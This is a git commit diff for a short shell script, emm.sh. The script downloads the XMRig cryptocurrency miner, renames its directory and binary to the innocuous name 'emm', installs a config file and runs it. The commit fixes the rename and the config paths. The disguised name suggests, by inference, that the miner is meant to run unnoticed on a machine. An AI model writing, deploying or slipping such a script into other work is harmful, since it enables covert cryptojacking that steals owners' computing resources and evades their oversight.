82e5436f273f92da3ba390a524883b413126adc4
hyjtiny <hyjtiny@hotmail.com>
2025-09-29 19:16:13 +0800

    Update emm.sh

--- emm.sh
+++ emm.sh
@@ -1,6 +1,6 @@
 wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz -O xmrig.tar.gz
 tar -zxvf xmrig.tar.gz
-mv xmrig* emm
+mv xmrig*/ emm
 mv emm/xmrig emm/emm
-cp config.json xmrig/config.json
+cp config.json emm/config.json
 ./emm/emm
